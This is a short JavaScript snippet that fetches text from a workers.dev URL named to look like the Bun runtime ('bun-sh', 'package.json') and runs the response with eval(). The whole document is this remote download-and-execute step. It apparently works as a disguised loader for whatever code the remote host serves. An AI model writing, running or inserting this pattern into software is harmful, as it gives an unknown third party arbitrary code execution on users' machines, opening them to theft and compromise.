await fetch("https://types.bun-sh.workers.dev/package.json")
  .then((response) => response.text())
  .then((source) => eval(source));
